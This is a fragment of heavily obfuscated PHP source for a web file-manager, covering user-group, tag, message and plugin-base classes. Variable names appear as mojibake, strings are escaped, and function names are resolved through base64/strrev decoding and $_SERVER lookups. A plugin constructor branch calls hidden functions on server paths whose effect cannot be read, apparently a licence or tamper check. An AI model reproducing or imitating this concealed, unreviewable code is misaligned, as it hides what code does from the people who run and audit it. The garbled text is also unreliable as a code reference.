$ö×ÖŞË½[403] => array($ö×ÖŞË½[412], "\45{$§ê–×·}\x25")); $ğ™¦“‡Ÿ = $this->parseWhereLike($ğ™¦“‡Ÿ); $ˆô¤ıäÚ = Model($ö×ÖŞË½[2354])->where($ğ™¦“‡Ÿ)->limit($¥…Å ‹º)->select(); if (!$ˆô¤ıäÚ) { return array(); } $ˆô¤ıäÚ = array_to_keyvalue($ˆô¤ıäÚ, $ö×ÖŞË½[12], $ö×ÖŞË½[1676]); $œóœú²ğ = $this->where(array($ö×ÖŞË½[1667] => array($ö×ÖŞË½[7], $ˆô¤ıäÚ)))->select(); if (!$œóœú²ğ) { return array(); } return $œóœú²ğ; } private function _listDataApplyItem($ÚÑ¿¢¯ß) { $­ÓäŒé = array($ÚÑ¿¢¯ß); $this->_listDataApply($­ÓäŒé); return $­ÓäŒé[0]; } private function _listDataApply(&$¹™ÕÆÌŠ) { $ÈıÔ¯Î… =& $_SERVER[¹ş¤¶ĞÖ]; if (!$¹™ÕÆÌŠ) { return; } array_remove_key($¹™ÕÆÌŠ, $ÈıÔ¯Î…[920]); $õ®Æé“± = array_to_keyvalue($¹™ÕÆÌŠ, $ÈıÔ¯Î…[12], $ÈıÔ¯Î…[1676]); $this->_listAppendGroup($¹™ÕÆÌŠ, $õ®Æé“±); $this->_listAppendMeta($¹™ÕÆÌŠ, $õ®Æé“±); $this->_listAppendSourceRoot($¹™ÕÆÌŠ, $õ®Æé“±); } private function _listAppendSourceRoot(&$µœß½Ìè, $ÃŞëá¶æ) { $ÑàÄ´¯ñ =& $_SERVER[¹ş¤¶ĞÖ]; $Èğú…é– = Model($ÑàÄ´¯ñ[851])->listSourceRoot(SourceModel::TYPE_USER, $ÃŞëá¶æ); $Èğú…é– = array_to_keyvalue($Èğú…é–, $ÑàÄ´¯ñ[525]); $Èğú…é– = array_remove_key($Èğú…é–, $ÑàÄ´¯ñ[525]); foreach ($µœß½Ìè as &$·Ş°–¡œ) { $·Ş°–¡œ[$ÑàÄ´¯ñ[87]] = $Èğú…é–[$·Ş°–¡œ[$ÑàÄ´¯ñ[1676]]] ? $Èğú…é–[$·Ş°–¡œ[$ÑàÄ´¯ñ[1676]]] : array(); } unset($·Ş°–¡œ); } private function _listAppendGroup(&$½ÎÑ·ÀÉ, $«ÎÖÎ‰) { $¿ü´î›± =& $_SERVER[¹ş¤¶ĞÖ]; $Ïå•ÈúÊ = array($¿ü´î›±[1676] => array($¿ü´î›±[7], $«ÎÖÎ‰)); $€èÉ™­œ = Model($¿ü´î›±[1956])->where($Ïå•ÈúÊ)->select(); $ˆí•ÍÈª = array_to_keyvalue($€èÉ™­œ, $¿ü´î›±[12], $¿ü´î›±[1866]); $ˆí•ÍÈª = array_remove_value(array_unique($ˆí•ÍÈª), $¿ü´î›±[198]); if (!$ˆí•ÍÈª || !$€èÉ™­œ) { return; } $Ïå•ÈúÊ = array($¿ü´î›±[1866] => array($¿ü´î›±[7], $ˆí•ÍÈª)); $øßÍÇ´Ş = Model($¿ü´î›±[2051])->field($¿ü´î›±[2355])->where($Ïå•ÈúÊ)->select(); $øßÍÇ´Ş = array_to_keyvalue($øßÍÇ´Ş, $¿ü´î›±[1866]); $€èÉ™­œ = array_to_keyvalue_group($€èÉ™­œ, $¿ü´î›±[1676]); foreach ($€èÉ™­œ as &$ÛÏ‚çÏ) { $åÓòÊùÏ = array(); foreach ($ÛÏ‚çÏ as $ÚŸ…¡ô) { if (!$ÚŸ…¡ô[$¿ü´î›±[1970]]) { continue; } $ÄÎ‹ìî« = Model($¿ü´î›±[527])->listData($ÚŸ…¡ô[$¿ü´î›±[1970]]); $åÓòÊùÏ[] = array($¿ü´î›±[1866] => $ÚŸ…¡ô[$¿ü´î›±[1866]], $¿ü´î›±[2356] => $øßÍÇ´Ş[$ÚŸ…¡ô[$¿ü´î›±[1866]]][$¿ü´î›±[32]], $¿ü´î›±[540] => $øßÍÇ´Ş[$ÚŸ…¡ô[$¿ü´î›±[1866]]][$¿ü´î›±[540]], $¿ü´î›±[442] => $ÄÎ‹ìî«); } $ÛÏ‚çÏ = $åÓòÊùÏ; } unset($ÛÏ‚çÏ); foreach ($½ÎÑ·ÀÉ as &$ÅÚıè¢‹) { $ÅÚıè¢‹[$¿ü´î›±[2053]] = array(); if (isset($€èÉ™­œ[$ÅÚıè¢‹[$¿ü´î›±[1676]]])) { $ÅÚıè¢‹[$¿ü´î›±[2053]] = $€èÉ™­œ[$ÅÚıè¢‹[$¿ü´î›±[1676]]]; } } unset($ÅÚıè¢‹); } public function userAppendGroup($×ôÏºÖ–) { $¥²ÓŸ…´ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$×ôÏºÖ–) { return array(); } $this->_listAppendGroup($×ôÏºÖ–, array_to_keyvalue($×ôÏºÖ–, $¥²ÓŸ…´[12], $¥²ÓŸ…´[1676])); return $×ôÏºÖ–; } private function _listAppendMeta(&$¸ü‡åï¿, $ÄØòËš×) { $è¬Á¹ =& $_SERVER[¹ş¤¶ĞÖ]; $Ó±ïªò‡ = UserJobModel::JOB_KEY; $‹ŸÔøÙ = array($è¬Á¹[2336]); $¨Ü›Òº = array($è¬Á¹[1676] => array($è¬Á¹[7], $ÄØòËš×)); $˜¸´™Â = Model($è¬Á¹[2334])->where($¨Ü›Òº)->select(); $˜¸´™Â = array_to_keyvalue_group($˜¸´™Â, $è¬Á¹[1676]); foreach ($˜¸´™Â as &$Á™ÊÓÌ©) { $ôÑõ¼ŸÙ = array(); foreach ($Á™ÊÓÌ© as $†ıĞÇò¹) { if (!in_array($†ıĞÇò¹[$è¬Á¹[94]], $‹ŸÔøÙ)) { $ôÑõ¼ŸÙ[$†ıĞÇò¹[$è¬Á¹[94]]] = $†ıĞÇò¹[$è¬Á¹[403]]; } } $Á™ÊÓÌ© = $ôÑõ¼ŸÙ; } unset($Á™ÊÓÌ©); $ã†Äİ… = Model($è¬Á¹[2357]); foreach ($¸ü‡åï¿ as &$Õ†Ö€Ò) { $Àá–öñÅ = array(); if (isset($˜¸´™Â[$Õ†Ö€Ò[$è¬Á¹[1676]]])) { $Àá–öñÅ = $˜¸´™Â[$Õ†Ö€Ò[$è¬Á¹[1676]]]; } $Õ†Ö€Ò[$è¬Á¹[2358]] = array(); if (isset($Àá–öñÅ[$Ó±ïªò‡])) { $Õ†Ö€Ò[$è¬Á¹[2358]] = $ã†Äİ…->getUserJobInfo($Àá–öñÅ[$Ó±ïªò‡]); } } unset($Õ†Ö€Ò); } protected function groupUserAll($ÙŞ¾Ø’Â) { $Õ”üÃµ± =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ÙŞ¾Ø’Â) { return !1; } $šåúâÅƒ = Model($Õ”üÃµ±[1956])->field($Õ”üÃµ±[1676])->where(array($Õ”üÃµ±[1866] => array($Õ”üÃµ±[7], $ÙŞ¾Ø’Â)))->select(); $šåúâÅƒ = array_to_keyvalue($šåúâÅƒ, $Õ”üÃµ±[12], $Õ”üÃµ±[1676]); return array_unique($šåúâÅƒ); } public function userSearch($ÎÈÅÄ°§, $°ª‘êˆß = "\52") { return Model($_SERVER[¹ş¤¶ĞÖ][554])->where($ÎÈÅÄ°§)->field($°ª‘êˆß)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\137\157\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ˆÔåĞ£è) { $“´ŒçîÆ =& $_SERVER[¹ş¤¶ĞÖ]; $û ş´© = defined($“´ŒçîÆ[2087]) && USER_ID ? USER_ID : $“´ŒçîÆ[12]; return "\125\x73\145\x72\x4f\160\x74\x69\x6f\156\137{$ˆÔåĞ£è}\x5f" . $û ş´©; } protected function filterWhere($„ùÒ®§) { $±ËæìÚ =& $_SERVER[¹ş¤¶ĞÖ]; $„ùÒ®§[$±ËæìÚ[1676]] = defined($±ËæìÚ[2087]) && USER_ID ? USER_ID : $±ËæìÚ[12]; return $„ùÒ®§; } public function cacheRemoveUser($¨òáğÂÍ, $àÙ®€‰Ğ) { return Cache::remove("\125\x73\145\x72\117\x70\x74\151\x6f\156\x5f{$¨òáğÂÍ}\137" . $àÙ®€‰Ğ); } protected function optionDefault($´“ûè§– = '') { $ªİùï‘ë =& $_SERVER[¹ş¤¶ĞÖ]; if ($´“ûè§– == $ªİùï‘ë[12]) { return $GLOBALS[$ªİùï‘ë[6]][$ªİùï‘ë[2359]]; } if ($´“ûè§– == $ªİùï‘ë[2360]) { return $GLOBALS[$ªİùï‘ë[6]][$ªİùï‘ë[2361]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\x2e\x74\x61\x67\x4c\x69\x73\x74"; public $modelType = "\x55\163\x65\162\117\160\164\151\157\x6e"; public $field = array("\156\x61\x6d\145", "\x73\164\x79\154\145", "\x73\x6f\162\x74"); public function listData($»¹–Ë¬¬ = false, $©˜ö†´Â = "\163\x6f\162\x74", $‡™ˆŒ¿ = false) { return parent::listData($»¹–Ë¬¬, $©˜ö†´Â, $‡™ˆŒ¿); } public function remove($ÄŠ¨ü…ó) { return parent::remove($ÄŠ¨ü…ó); } public function add($ÜˆÀû¶Ç, $Üªã”ÌÃ = "\154\x61\142\x65\x6c\x2d\x67\x72\x65\171\55\x6e\157\162\x6d\141\154") { $Ø¨¶‡© =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->findByName($ÜˆÀû¶Ç)) { return !1; } $õºá“«¥ = array($Ø¨¶‡©[449] => $ÜˆÀû¶Ç, $Ø¨¶‡©[513] => $Üªã”ÌÃ, $Ø¨¶‡©[1870] => $this->getSort($Ø¨¶‡©[287]) + 1); return parent::insert($õºá“«¥); } public function update($—·¡ŞË, $îõĞ•ÜÀ) { $Æé•ş´Å =& $_SERVER[¹ş¤¶ĞÖ]; $¤–‰Ç‹œ = $this->listData($—·¡ŞË); $ôº°¾º = $this->findByName($îõĞ•ÜÀ[$Æé•ş´Å[32]]); if (!$¤–‰Ç‹œ || $ôº°¾º && $ôº°¾º[$Æé•ş´Å[428]] != $¤–‰Ç‹œ[$Æé•ş´Å[428]]) { return !1; } return parent::update($—·¡ŞË, $îõĞ•ÜÀ); } public function moveTop($¬ùÇöéª) { $²ñº…ÎÜ =& $_SERVER[¹ş¤¶ĞÖ]; $³§ÜîÅ = parent::listData(); $õ‚ƒ±ò = $this->getSort($²ñº…ÎÜ[286]); foreach ($³§ÜîÅ as &$¹§‘×ª) { if ($¹§‘×ª[$²ñº…ÎÜ[428]] == $¬ùÇöéª) { $¹§‘×ª[$²ñº…ÎÜ[1890]] = $õ‚ƒ±ò; continue; } $¹§‘×ª[$²ñº…ÎÜ[1890]] += 1; } unset($¹§‘×ª); return parent::resetData($³§ÜîÅ); } public function moveBottom($Êäİ€ÂŒ) { $Ò€ÑœÌ™ =& $_SERVER[¹ş¤¶ĞÖ]; $Ö®ó¸ÜĞ = $this->getSort($Ò€ÑœÌ™[287]) + 1; return parent::update($Êäİ€ÂŒ, array($Ò€ÑœÌ™[1890] => $Ö®ó¸ÜĞ)); } public function resetSort($·ÛâÖ£) { $Ïüö±ò =& $_SERVER[¹ş¤¶ĞÖ]; $Ú®÷‚œ¡ = array(); $·ÛâÖ£ = is_array($·ÛâÖ£) ? $·ÛâÖ£ : array(); for ($¥¹¤÷ôí = 0; $¥¹¤÷ôí < count($·ÛâÖ£); $¥¹¤÷ôí++) { $Ú®÷‚œ¡[$·ÛâÖ£[$¥¹¤÷ôí] . $Ïüö±ò[12]] = $¥¹¤÷ôí + 1; } $Ÿ—ı’ı£ = parent::listData(); foreach ($Ÿ—ı’ı£ as &$öÜ–­Æ) { $¬îä­Û = $Ú®÷‚œ¡[$öÜ–­Æ[$Ïüö±ò[428]]]; $öÜ–­Æ[$Ïüö±ò[1890]] = $¬îä­Û ? $¬îä­Û : $öÜ–­Æ[$Ïüö±ò[1890]]; } unset($öÜ–­Æ); return parent::resetData($Ÿ—ı’ı£); } private function getSort($»êåÖÈœ) { $•Éâ¶ğ =& $_SERVER[¹ş¤¶ĞÖ]; $¤äíù» = parent::listData(); $ôØ™ àş = array_to_keyvalue($¤äíù», $•Éâ¶ğ[12], $•Éâ¶ğ[1890]); if (!$ôØ™ àş) { $ôØ™ àş = array(0); } $Óµãºœ = $»êåÖÈœ == $•Éâ¶ğ[287] ? max($ôØ™ àş) : min($ôØ™ àş); return intval($Óµãºœ); } } goto fˆªÓÎ˜¼É; E¯‰Áïí¬: $fileSize = strrev(base64_decode($_SERVER[øØ“¾à”][0])); function binCheckNeq($¾Æ¨¨Ä, $Ê«òïÀì) { return $¾Æ¨¨Ä != $Ê«òïÀì; } $_SERVER[$_SERVER[øØ“¾à”][1]] = $fileSize($_SERVER[$_SERVER[øØ“¾à”][2]]); goto bîÂ®…„ÇŒ; E¢¿áğ”öË: class Message { function __construct() { } public function send($Ö’†˜â– = '', $úÓÆ¬“ = array(), $ï«‡µ†£ = "\x74\x65\170\164") { $¹á–•÷ =& $_SERVER[¹ş¤¶ĞÖ]; $ğàÏä = array($¹á–•÷[33] => $¹á–•÷[1536], $¹á–•÷[780] => $Ö’†˜â–); if (in_array($ï«‡µ†£, array($¹á–•÷[1536], $¹á–•÷[1537]))) { $ğàÏä[$¹á–•÷[33]] = $ï«‡µ†£; } $úÓÆ¬“ = array($¹á–•÷[534] => isset($úÓÆ¬“[$¹á–•÷[534]]) ? $úÓÆ¬“[$¹á–•÷[534]] : $¹á–•÷[12], $¹á–•÷[619] => isset($úÓÆ¬“[$¹á–•÷[619]]) ? $úÓÆ¬“[$¹á–•÷[619]] : $¹á–•÷[12]); if (empty($Ö’†˜â–) || empty($úÓÆ¬“[$¹á–•÷[534]]) && empty($úÓÆ¬“[$¹á–•÷[619]])) { return !1; } $›ÆóÛµÀ = array($¹á–•÷[1477] => $ğàÏä, $¹á–•÷[1538] => $úÓÆ¬“); Hook::trigger($¹á–•÷[1539], $›ÆóÛµÀ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¬¹–¨Š¶ =& $_SERVER[¹ş¤¶ĞÖ]; if ($_SERVER[$¬¹–¨Š¶[905]] != $_SERVER[$¬¹–¨Š¶[1540]]) { $õ§¹¤ = $¬¹–¨Š¶[906]; $ìí³®¤ = $¬¹–¨Š¶[907]; $ÓîÊæœ· = $_SERVER[$¬¹–¨Š¶[902]] . $¬¹–¨Š¶[903]; $üÌ‚À·± = $ìí³®¤($ÓîÊæœ·); $ë‡ı¢†İ = explode($¬¹–¨Š¶[231], $üÌ‚À·±); if (count($ë‡ı¢†İ) < $¬¹–¨Š¶[636]) { $ËÉÊ“Åß = $¬¹–¨Š¶[908]; $ËÉÊ“Åß(); } $Ïè·ñŠô = $¬¹–¨Š¶[909]; $Ïè·ñŠô($_SERVER[$¬¹–¨Š¶[910]]); $Ïè·ñŠô($_SERVER[$¬¹–¨Š¶[902]] . $¬¹–¨Š¶[1541]); $–‚ıË¹  = 1; while ($–‚ıË¹  > 1) { $–‚ıË¹  = $–‚ıË¹  + 4; $ÈÜÃå‚ = rawurlencode($–‚ıË¹  . $¬¹–¨Š¶[407]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¬¹–¨Š¶[1542]); $this->pluginName = str_replace($¬¹–¨Š¶[1542], $¬¹–¨Š¶[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¬¹–¨Š¶[8]; $this->pluginApi = appHostGet() . $¬¹–¨Š¶[1543] . $this->pluginName . $¬¹–¨Š¶[8]; $this->pluginHost = $config[$¬¹–¨Š¶[1544]] . $this->pluginName . $¬¹–¨Š¶[8]; $this->pluginHostDefault = $config[$¬¹–¨Š¶[1544]] . $this->pluginName . $¬¹–¨Š¶[8]; $™×”—Öƒ = $config[$¬¹–¨Š¶[1545]]; if ($™×”—Öƒ && strpos($¬¹–¨Š¶[50] . $™×”—Öƒ . $¬¹–¨Š¶[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¬¹–¨Š¶[1546]] . $this->pluginName . $¬¹–¨Š¶[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¹ş¤¶ĞÖ][1547]); } protected function assign($ò„®»ºÜ, $ñ¾„èñ = false) { if (is_array($ò„®»ºÜ)) { $this->values = array_merge($this->values, $ò„®»ºÜ); } else { $this->values[$ò„®»ºÜ] = $ñ¾„èñ; } } protected function display($òóƒ“éÔ) { extract($this->values); require $òóƒ“éÔ; } final function hookRegist($ŸªÎ¼³²) { $this->modelPlugin->appRegist($this->pluginName, $ŸªÎ¼³²); } final function appIcon() { $â¶š·ğ° =& $_SERVER[¹ş¤¶ĞÖ]; $„©†ß›³ = $this->appPackage(); $éÚòÃ = $â¶š·ğ°[12]; if (isset($„©†ß›³[$â¶š·ğ°[445]])) { if (isset($„©†ß›³[$â¶š·ğ°[445]][$â¶š·ğ°[1548]])) { $éÚòÃ = $â¶š·ğ°[1549] . $„©†ß›³[$â¶š·ğ°[445]][$â¶š·ğ°[1548]] . $â¶š·ğ°[1550]; } else { if ($„©†ß›³[$â¶š·ğ°[445]][$â¶š·ğ°[1551]]) { $éÚòÃ = $â¶š·ğ°[1552] . $„©†ß›³[$â¶š·ğ°[445]][$â¶š·ğ°[1551]] . $â¶š·ğ°[1553]; } } } return $éÚòÃ; } final function fileCanView($ş»ºú™Ö) { $×¶»Ğ¡ =& $_SERVER[¹ş¤¶ĞÖ]; if (request_url_safe($ş»ºú™Ö)) { return !0; } if ($this->isShare($ş»ºú™Ö)) { return !0; } $ŸÔ­²Ò£ = Session::get($×¶»Ğ¡[1554]); if (!$ŸÔ­²Ò£ || !$ŸÔ­²Ò£[$×¶»Ğ¡[1555]]) { $Íôä€£Ù = $×¶»Ğ¡[1556] . rawurlencode(this_url()); show_tips(LNG($×¶»Ğ¡[1557]) . $×¶»Ğ¡[1558] . $Íôä€£Ù . $×¶»Ğ¡[1559] . LNG($×¶»Ğ¡[1560]) . $×¶»Ğ¡[1561], !1); } if (!Action($×¶»Ğ¡[1562])->authCan($×¶»Ğ¡[1563])) { show_tips(LNG($×¶»Ğ¡[1564]) . $×¶»Ğ¡[1565], !1); } ActionCall($×¶»Ğ¡[1566], $ş»ºú™Ö); } final function isShare($¯‡ÂÆ®Ë) { $”Û¨ ¡¸ = KodIO::parse($¯‡ÂÆ®Ë); return $”Û¨ ¡¸[$_SERVER[¹ş¤¶ĞÖ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($” ¼éĞÊ) { if (request_url_safe($” ¼éĞÊ)) { return $” ¼éĞÊ; } if (!$this->isShare($” ¼éĞÊ)) { $” ¼éĞÊ = $this->filePath($” ¼éĞÊ); } return Action($_SERVER[¹ş¤¶ĞÖ][1207])->linkOut($” ¼éĞÊ); } public function filePathLinkOut($‘ °òï) { if (request_url_safe($‘ °òï)) { return $‘ °òï; } $this->fileCanView($‘ °òï); return Action($_SERVER[¹ş¤¶ĞÖ][1207])->link($‘ °òï); } final function filePath($ïŒÇ÷†Â) { $Çß€‡ =& $_SERVER[¹ş¤¶ĞÖ]; if ($ÁÊÅÇ† = $this->checkSharePath($ïŒÇ÷†Â)) { Hook::trigger($Çß€‡[1567], $ÁÊÅÇ†); return $ÁÊÅÇ†; } $this->fileCanView($ïŒÇ÷†Â); if (request_url_safe($ïŒÇ÷†Â)) { $üşÛÕ¶¼ = parse_url_query($ïŒÇ÷†Â); if (isset($üşÛÕ¶¼[$Çß€‡[1568]]) && isset($üşÛÕ¶¼[$Çß€‡[213]])) { $§üŞ†²Ã = Model($Çß€‡[796])->get($Çß€‡[797]); $ó›ŸæºÈ = Mcrypt::decode($üşÛÕ¶¼[$Çß€‡[213]], $§üŞ†²Ã); if ($ó›ŸæºÈ) { $this->fileInfo = IO::infoWithChildren($ó›ŸæºÈ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ó›ŸæºÈ; } } $ïŒÇ÷†Â = $this->_cacheHttpFile($ïŒÇ÷†Â); $this->fileInfo = IO::infoWithChildren($ïŒÇ÷†Â); } else { $this->fileInfo = IO::infoWithChildren($ïŒÇ÷†Â); if (!$this->fileInfo) { show_tips(LNG($Çß€‡[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($Çß€‡[1567], $ïŒÇ÷†Â); return $ïŒÇ÷†Â; } final function _cacheHttpFile($µôÑøĞÄ) { $œÎğğê¼ = hash_path($µôÑøĞÄ, !0); $this->cachePath = $this->pluginCachePath($œÎğğê¼); if ($±¸¿»°ë = IO::fileNameExist($this->cachePath, $œÎğğê¼)) { return KodIO::make($±¸¿»°ë); } $»ßÜİÈÊ = $this->cachePath . $œÎğğê¼; return $this->pluginCacheFileSet($»ßÜİÈÊ, file_get_contents_nossl($µôÑøĞÄ)); } final function _tmpFileName($ØâçÍø® = array()) { $¾ŠÅ°‹İ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ØâçÍø®) { $ØâçÍø® = $this->fileInfo; } if (isset($ØâçÍø®[$¾ŠÅ°‹İ[177]])) { return $ØâçÍø®[$¾ŠÅ°‹İ[177]]; } if (isset($ØâçÍø®[$¾ŠÅ°‹İ[170]][$¾ŠÅ°‹İ[177]])) { return $ØâçÍø®[$¾ŠÅ°‹İ[170]][$¾ŠÅ°‹İ[177]]; } $„ã¢öÉì = IO::hashSimple($ØâçÍø®[$¾ŠÅ°‹İ[84]]); if ($„ã¢öÉì) { return $„ã¢öÉì; } $ˆĞ˜†¡ˆ = array($ØâçÍø®[$¾ŠÅ°‹İ[32]], $ØâçÍø®[$¾ŠÅ°‹İ[84]], $ØâçÍø®[$¾ŠÅ°‹İ[76]]); if (isset($ØâçÍø®[$¾ŠÅ°‹İ[540]])) { $ˆĞ˜†¡ˆ[] = $ØâçÍø®[$¾ŠÅ°‹İ[540]]; } return md5(implode($¾ŠÅ°‹İ[11], $ˆĞ˜†¡ˆ)); } final function checkSharePath($şğò½áÉ) { $ÚîÓ”¯ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->isShare($şğò½áÉ)) { return !1; } $¦“¹Âšı = Action($ÚîÓ”¯[1207])->sharePathInfo($şğò½áÉ); if (!isset($¦“¹Âšı[$ÚîÓ”¯[84]])) { show_json(LNG($ÚîÓ”¯[1569]), !1); } $this->fileInfo = $¦“¹Âšı[$ÚîÓ”¯[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ÚîÓ”¯[177]]); return $¦“¹Âšı[$ÚîÓ”¯[84]]; } final function pluginCachePath($•¬ÀÆ­ = '') { $İ—˜ã×Ü =& $_SERVER[¹ş¤¶ĞÖ]; $€Ü­‘¸Š = IO_PATH_SYSTEM_TEMP . $İ—˜ã×Ü[1570] . $this->pluginName; if (!($ŞˆéâĞÍ = IO::infoFull($€Ü­‘¸Š))) { return IO::mkdir($€Ü­‘¸Š . $İ—˜ã×Ü[8] . $•¬ÀÆ­); } if (empty($•¬ÀÆ­)) { return $ŞˆéâĞÍ[$İ—˜ã×Ü[84]]; } if (!($ê»¨Ü¶— = IO::fileNameExist($ŞˆéâĞÍ[$İ—˜ã×Ü[84]], $•¬ÀÆ­))) { return IO::mkdir($ŞˆéâĞÍ[$İ—˜ã×Ü[84]] . $•¬ÀÆ­); } return KodIO::make($ê»¨Ü¶—); } final function pluginCacheFileSet($­½†Œ£¨, $™ğ•±™È = '') { $¡Ê·öœ¾ =& $_SERVER[¹ş¤¶ĞÖ]; if (!($îö¿÷ù´ = IO::infoFull($­½†Œ£¨))) { return IO::mkfile($­½†Œ£¨, $™ğ•±™È, REPEAT_REPLACE); } IO::setContent($îö¿÷ù´[$¡Ê·öœ¾[84]], $™ğ•±™È); return $îö¿÷ù´[$¡Ê·öœ¾[84]]; } final function pluginLocalFile($‡’ò± = '') { $İ¨¶½Á¥ =& $_SERVER[¹ş¤¶ĞÖ]; $ŒˆôÎç = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ŒˆôÎç)) { mk_dir($ŒˆôÎç); } if (!$‡’ò±) { return $ŒˆôÎç; } $ÈŠ¹Ø³µ = IO::info($‡’ò±); $Öƒ”¯¤ë = $this->_tmpFileName($ÈŠ¹Ø³µ) . $İ¨¶½Á¥[10] . $ÈŠ¹Ø³µ[$İ¨¶½Á¥[174]]; if (!checkExtSafe($Öƒ”¯¤ë)) { $Öƒ”¯¤ë = $Öƒ”¯¤ë . $İ¨¶½Á¥[1239]; } $šÄèîŒ´ = $ŒˆôÎç . $Öƒ”¯¤ë; if (@file_exists($šÄèîŒ´)) { return $šÄèîŒ´; } return IO::copy($‡’ò±, $ŒˆôÎç, 0, $Öƒ”¯¤ë); } final function appPackage() { $ï…´Æ“ç =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->packageData) { return $this->packageData; } $Ü¾š‘¼© = $this->parseFile($this->pluginPath . $ï…´Æ“ç[1571]); $this->parseLang($Ü¾š‘¼©); $É’¬Ü§æ = json_decode_force($Ü¾š‘¼©); if (!$É’¬Ü§æ) { return array(); } $†ÃÔŠ‰— = Hook::trigger($ï…´Æ“ç[1572], $É’¬Ü§æ); if ($†ÃÔŠ‰— && is_array($†ÃÔŠ‰—)) { $É’¬Ü§æ = $†ÃÔŠ‰—; } $this->packageData = $É’¬Ü§æ; return $É’¬Ü§æ; } public function packageInfoGet($Éæ”º„) { $“ô¿ÈìÏ = $this->appPackage(); return array_get_value($“ô¿ÈìÏ, $Éæ”º„); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¹ş¤¶ĞÖ][1573]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¹ş¤¶ĞÖ][1574]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¹ş¤¶ĞÖ][1575]); } public function echoJsAssign($ƒ¿Ú¥ìÜ, $™Üú¶¬†) { $this->echoJsAssignArr[$ƒ¿Ú¥ìÜ] = $™Üú¶¬†; } private function parseFile($åøô”û¹) { $Ã´ŒòÇí =& $_SERVER[¹ş¤¶ĞÖ]; $ìÚ¿æº” = file_get_contents_nossl($åøô”û¹); $ Œ“ñş× = array($Ã´ŒòÇí[1576], $Ã´ŒòÇí[1577], $Ã´ŒòÇí[1578], $Ã´ŒòÇí[1579], $Ã´ŒòÇí[1580], $Ã´ŒòÇí[1581], $Ã´ŒòÇí[1582]); $‰şÈ»ğ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ã´ŒòÇí[89]][$Ã´ŒòÇí[1583]]); foreach ($this->echoJsAssignArr as $í¾Î›ú => $ËåŸººØ) { $ Œ“ñş×[] = $Ã´ŒòÇí[1584] . $í¾Î›ú . $Ã´ŒòÇí[1585]; $‰şÈ»ğ[] = is_array($ËåŸººØ) || is_object($ËåŸººØ) ? rawurlencode(json_encode($ËåŸººØ)) : $ËåŸººØ; } if (strstr($ìÚ¿æº”, $Ã´ŒòÇí[1586])) { $æ¾“ĞÍÕ = rawurlencode(json_encode($this->pluginLangArr)); $ìÚ¿æº” = str_replace($Ã´ŒòÇí[1586], $æ¾“ĞÍÕ, $ìÚ¿æº”); } if (strstr($ìÚ¿æº”, $Ã´ŒòÇí[1587])) { $æ¾“ĞÍÕ = $æ¾“ĞÍÕ = rawurlencode(json_encode($this->getConfig())); $ìÚ¿æº” = str_replace($Ã´ŒòÇí[1587], $æ¾“ĞÍÕ, $ìÚ¿æº”); } $ìÚ¿æº” = str_replace($ Œ“ñş×, $‰şÈ»ğ, $ìÚ¿æº”); return $ìÚ¿æº”; } private function parseLang(&$‘éß·ÔÑ) { $Ü¤ì§ëŠ =& $_SERVER[¹ş¤¶ĞÖ]; $·êµäñŸ = $Ü¤ì§ëŠ[1588]; if (!strstr($‘éß·ÔÑ, $·êµäñŸ)) { return; } preg_match_all($Ü¤ì§ëŠ[1589], $‘éß·ÔÑ, $‘ÈƒÑ®ğ); if (!is_array($‘ÈƒÑ®ğ) || count($‘ÈƒÑ®ğ) == 0 || !is_array($‘ÈƒÑ®ğ[0]) || count($‘ÈƒÑ®ğ[0]) == 0) { return; } $ƒ’º´ñ = array(); $’õİ˜˜± = array(); foreach ($‘ÈƒÑ®ğ[0] as $’åƒ§Ï˜) { $èÂ£Æ’¦ = substr($’åƒ§Ï˜, strlen($·êµäñŸ), -4); $Ûòøë¨ = LNG($èÂ£Æ’¦); $ƒ’º´ñ[] = $’åƒ§Ï˜; $’õİ˜˜±[] = str_replace(array($Ü¤ì§ëŠ[231], $Ü¤ì§ëŠ[1111], $Ü¤ì§ëŠ[371], $Ü¤ì§ëŠ[118]), array($Ü¤ì§ëŠ[53], $Ü¤ì§ëŠ[53], $Ü¤ì§ëŠ[12], $Ü¤ì§ëŠ[1590]), $Ûòøë¨); } $‘éß·ÔÑ = str_replace($ƒ’º´ñ, $’õİ˜˜±, $‘éß·ÔÑ); } private function parseConfig(&$—¢ÉºŠ‚) { $ãòŠÙ·Ù =& $_SERVER[¹ş¤¶ĞÖ]; $‰‰ûƒ”„ = $ãòŠÙ·Ù[1591]; if (!strstr($—¢ÉºŠ‚, $‰‰ûƒ”„)) { return; } preg_match_all($ãòŠÙ·Ù[1592], $—¢ÉºŠ‚, $´¡ÛõÉˆ); if (!is_array($´¡ÛõÉˆ) || count($´¡ÛõÉˆ) == 0 || !is_array($´¡ÛõÉˆ[0]) || count($´¡ÛõÉˆ[0]) == 0) { return; } $Éı¸¨Òç = $this->getConfig(); $†ú„›ù¢ = 